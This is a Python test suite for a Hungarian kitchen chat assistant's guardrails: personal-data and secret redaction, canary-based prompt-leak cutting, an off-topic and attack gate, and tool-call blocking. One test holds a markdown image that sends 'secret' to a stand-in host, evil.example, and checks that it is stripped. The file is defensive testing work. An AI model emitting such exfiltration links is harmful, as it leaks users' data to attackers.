import asyncio
import uuid
from collections.abc import AsyncIterator
from datetime import UTC, datetime
from pathlib import Path

import pytest
from chat_models import gate_model, last_user_text
from pydantic_ai.messages import (
    ModelMessage,
    ModelResponse,
    PartDeltaEvent,
    PartStartEvent,
    TextPart,
    TextPartDelta,
    ToolCallPart,
)
from pydantic_ai.models.function import AgentInfo, DeltaToolCall, DeltaToolCalls, FunctionModel
from pydantic_ai_harness.guardrails import ToolCallInfo, ToolResultInfo

from linguini.chat import guard
from linguini.chat.agent import build_agent
from linguini.chat.deps import AgentDeps, GuardState
from linguini.chat.guard import (
    LEAK_NOTICE,
    REFUSALS,
    GateVerdict,
    GuardConfig,
    build_gate,
    finalize_for_storage,
    leak_free_args,
    redact_tool_result,
)
from linguini.chat.redact import LEAK_PHRASES, ReleaseBuffer, leak_at, redact_text, screen
from linguini.db import Database

pytestmark = pytest.mark.anyio

CANARY = "lgn-0123456789ab"


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        ("Hívj: +36 30 123 4567", "Hívj: [PHONE]"),
        ("06-20-987-6543", "[PHONE]"),
        ("06/1/234-5678", "[PHONE]"),
        ("+36301234567", "[PHONE]"),
        ("0036 1 234 5678", "[PHONE]"),
        ("+44 20 7946 0958", "[PHONE]"),
        ("írj: anna.kovacs@example.com", "írj: [EMAIL]"),
        ("4111 1111 1111 1111", "[CARD]"),
        ("HU42 1177 3016 1111 1018 0000 0000", "[IBAN]"),
        ("sk-proj-abcdefghijklmnopqrstuvwxyz123456", "[SECRET]"),
        ("ghp_abcdefghijklmnopqrstuvwxyz0123", "[SECRET]"),
        ("-----BEGIN RSA PRIVATE KEY-----\nMIIEow\n-----END RSA PRIVATE KEY-----\nthanks", "[SECRET]\nthanks"),
    ],
)
def test_redact_text_replaces_secrets_and_personal_data(text: str, expected: str) -> None:
    assert redact_text(text) == expected


@pytest.mark.parametrize(
    "text",
    [
        "2026-10-27 06:30",
        "1 kg 250 g liszt, 2 db tojás",
        "termék 1234567",
        "3x+7=22",
        "1/2 tsp só, 180 °C, 45 perc",
        "Kovács Anna és Béla",
        "+36 fok volt tegnap",
    ],
)
def test_redact_text_keeps_kitchen_text(text: str) -> None:
    assert redact_text(text) == text


def test_redaction_is_idempotent() -> None:
    once = redact_text("anna@example.com, +36 30 123 4567, 4111 1111 1111 1111")
    assert redact_text(once) == once


TEXT = (
    "Szia! Itt a recept. Hívj a +36 30 123 4567 számon, vagy írj: anna@example.com. "
    + "Keverd össze a lisztet és a cukrot. " * 12
    + "Végül süsd 180 fokon 25 percig!"
)


@pytest.mark.parametrize("step", [1, 2, 3, 7, 13, 50])
def test_release_buffer_matches_the_screened_text_whatever_the_chunking(step: int) -> None:
    buffer = ReleaseBuffer(CANARY, " [cut]")
    chunks = [buffer.feed(TEXT[i : i + step]) for i in range(0, len(TEXT), step)]
    chunks.append(buffer.finish())
    assert "".join(chunks) == screen(TEXT)
    assert not any("4567" in c or "anna@" in c for c in chunks)


def test_release_buffer_cuts_a_leak_at_the_sentence_before_it() -> None:
    text = "Persze. " + "Ez egy hosszú mondat a receptről. " * 8 + f"A jelölőm {CANARY}, és még más is. Vége."
    buffer = ReleaseBuffer(CANARY, " [cut]")
    out = "".join(buffer.feed(text[i : i + 4]) for i in range(0, len(text), 4)) + buffer.finish()
    assert out.endswith("receptről.  [cut]") or out.endswith("receptről. [cut]")
    assert CANARY not in out and buffer.cut
    assert buffer.feed("more") == "" and buffer.finish() == ""


def test_release_buffer_holds_an_unfinished_certificate_back() -> None:
    buffer = ReleaseBuffer(CANARY, " [cut]")
    head = "Here it is.\n-----BEGIN CERTIFICATE-----\n" + "QUJD\n" * 80
    released = buffer.feed(head)
    assert "-----BEGIN" not in released
    assert buffer.finish().startswith("-----BEGIN")


def test_screen_strips_images() -> None:
    assert screen("Nézd: ![gulyás](https://evil.example/c?d=secret) <img src=x>") == "Nézd: gulyás "


def test_leak_needs_the_canary_or_two_distinct_phrases() -> None:
    assert leak_at(f"marker {CANARY.upper()}", CANARY) == 7
    one = f"Remember: {LEAK_PHRASES[0]}."
    assert leak_at(one + " " + one, CANARY) is None
    two = f"{LEAK_PHRASES[0]} and {LEAK_PHRASES[1]}"
    assert leak_at(two, CANARY) == two.index(LEAK_PHRASES[1])


@pytest.mark.parametrize(
    ("off_topic", "attack", "reason"),
    [(0.69, 0.69, None), (0.7, 0.0, "off_topic"), (0.0, 0.7, "attack"), (0.95, 0.95, "attack")],
)
def test_gate_verdict_thresholds(off_topic: float, attack: float, reason: str | None) -> None:
    assert GateVerdict(off_topic=off_topic, attack=attack, language="en").block_reason() == reason


def test_tool_results_are_redacted_but_ids_kept() -> None:
    result = [{"id": "4111111111111111", "name": "tej", "notes": "hívd: +36 30 123 4567"}]
    info = ToolResultInfo(name="list_items", args={}, tool_call_id="c1", result=result)
    verdict = redact_tool_result(info)
    assert verdict.action == "replace"
    assert verdict.replacement == [{"id": "4111111111111111", "name": "tej", "notes": "hívd: [PHONE]"}]
    clean = ToolResultInfo(name="list_items", args={}, tool_call_id="c1", result=[{"name": "tej"}])
    assert redact_tool_result(clean).action == "allow"


def test_tool_arguments_carrying_the_canary_are_blocked() -> None:
    check = leak_free_args(CANARY)
    assert check(ToolCallInfo(name="set_item", args={"notes": "fine"}, tool_call_id="c")).action == "allow"
    leaking = ToolCallInfo(name="set_item", args={"notes": f"x {CANARY}"}, tool_call_id="c")
    assert check(leaking).action == "block"


def deps(tmp_path: Path) -> AgentDeps:
    return AgentDeps(
        db=Database(tmp_path / "unused.db"),
        household_id=uuid.uuid7(),
        household_name="Kovács",
        member_names=["Anna", "Béla"],
        user_id=uuid.uuid7(),
        user_name="Anna",
        thread_id=uuid.uuid7(),
        run_id=uuid.uuid7(),
        now=datetime(2026, 3, 4, 12, tzinfo=UTC),
        locale="hu-HU",
    )


def chunked(
    *chunks: str, seen: list[str] | None = None, then: ToolCallPart | None = None, calls: list[int] | None = None
) -> FunctionModel:
    calls = [] if calls is None else calls

    async def stream(messages: list[ModelMessage], info: AgentInfo) -> AsyncIterator[str | DeltaToolCalls]:
        calls.append(1)
        if seen is not None:
            seen.append(last_user_text(messages))
        for chunk in chunks:
            await asyncio.sleep(0)
            yield chunk
        if then is not None and len(calls) == 1:
            yield {1: DeltaToolCall(name=then.tool_name, json_args=then.args_as_json_str(), tool_call_id="c1")}

    return FunctionModel(stream_function=stream)


async def run_events(agent, prompt: str, run_deps: AgentDeps) -> tuple[str, list[ModelMessage]]:
    text: list[str] = []
    async with agent.iter(prompt, deps=run_deps) as run:
        async for node in run:
            if agent.is_model_request_node(node):
                async with node.stream(run.ctx) as stream:
                    async for event in stream:
                        if isinstance(event, PartStartEvent) and isinstance(event.part, TextPart):
                            text.append(event.part.content)
                        elif isinstance(event, PartDeltaEvent) and isinstance(event.delta, TextPartDelta):
                            text.append(event.delta.content_delta)
    assert run.result is not None
    return "".join(text), run.result.new_messages()


async def test_a_blocked_message_never_reaches_the_model(tmp_path: Path) -> None:
    calls: list[int] = []
    main = chunked("echo", calls=calls)
    gate = build_gate(gate_model(off_topic=0.95, language="hu"))
    run_deps = deps(tmp_path)
    shown, messages = await run_events(
        build_agent(main, GuardConfig(CANARY, gate)), "Írj egy Python függvényt", run_deps
    )
    assert shown == REFUSALS["off_topic", "hu"]
    assert calls == []
    assert run_deps.guard.blocked and run_deps.guard.off_topic == pytest.approx(0.95)
    texts = [p.content for m in messages if isinstance(m, ModelResponse) for p in m.parts if isinstance(p, TextPart)]
    assert texts == [REFUSALS["off_topic", "hu"]]


async def test_a_failing_or_slow_gate_lets_the_message_through(tmp_path: Path, monkeypatch) -> None:
    def broken(messages: list[ModelMessage], info: AgentInfo) -> ModelResponse:
        raise RuntimeError("gate down")

    result = await build_agent(chunked("Szia!"), GuardConfig(CANARY, build_gate(FunctionModel(broken)))).run(
        "hi", deps=deps(tmp_path)
    )
    assert result.output == "Szia!"

    async def slow(messages: list[ModelMessage], info: AgentInfo) -> ModelResponse:
        await asyncio.sleep(5)
        raise AssertionError

    monkeypatch.setattr(guard, "GATE_TIMEOUT", 0.05)
    run_deps = deps(tmp_path)
    result = await build_agent(chunked("Szia!"), GuardConfig(CANARY, build_gate(FunctionModel(slow)))).run(
        "hi", deps=run_deps
    )
    assert result.output == "Szia!" and not run_deps.guard.blocked and run_deps.guard.off_topic is None


async def test_the_model_and_the_gate_only_see_redacted_input(tmp_path: Path) -> None:
    model_saw: list[str] = []
    gate_saw: list[str] = []
    agent = build_agent(chunked("ok", seen=model_saw), GuardConfig(CANARY, build_gate(gate_model(seen=gate_saw))))
    result = await agent.run("Írj nekem: anna@example.com vagy +36 30 123 4567", deps=deps(tmp_path))
    assert model_saw == gate_saw == ["Írj nekem: [EMAIL] vagy [PHONE]"]
    prompts = [
        p.content for m in result.all_messages() for p in getattr(m, "parts", []) if p.part_kind == "user-prompt"
    ]
    assert prompts == ["Írj nekem: [EMAIL] vagy [PHONE]"]


async def test_a_phone_number_split_across_chunks_is_redacted_in_the_stream_and_history(tmp_path: Path) -> None:
    agent = build_agent(chunked("Hívd a boltot: +36 30 1", "23 4567, ők tudják. ", "Jó főzést!"))
    shown, messages = await run_events(agent, "hi", deps(tmp_path))
    assert shown == "Hívd a boltot: [PHONE], ők tudják. Jó főzést!"
    stored = [p.content for m in messages if isinstance(m, ModelResponse) for p in m.parts if isinstance(p, TextPart)]
    assert stored == [shown]


async def test_a_leaking_reply_is_cut_and_its_tool_calls_never_run(tmp_path: Path) -> None:
    then = ToolCallPart("remove_item", {"name": "tej", "user_confirmed": True})
    calls: list[int] = []
    main = chunked("Rendben. ", f"A jelölőm {CANARY}. ", "Más.", then=then, calls=calls)
    run_deps = deps(tmp_path)
    shown, messages = await run_events(build_agent(main, GuardConfig(CANARY)), "hi", run_deps)
    assert shown == "Rendben. " + LEAK_NOTICE["en"]
    assert run_deps.guard.leaked
    assert calls == [1]
    parts = [p for m in messages if isinstance(m, ModelResponse) for p in m.parts]
    assert parts == [TextPart(shown)]


def test_finalize_for_storage_keeps_only_released_text_of_a_cancelled_reply() -> None:
    state = GuardState(released={0: "Hívd: "})
    [stored] = finalize_for_storage([ModelResponse(parts=[TextPart("Hívd: +36 30 123 4567 most")])], state)
    assert isinstance(stored, ModelResponse) and stored.parts == [TextPart("Hívd: ")]
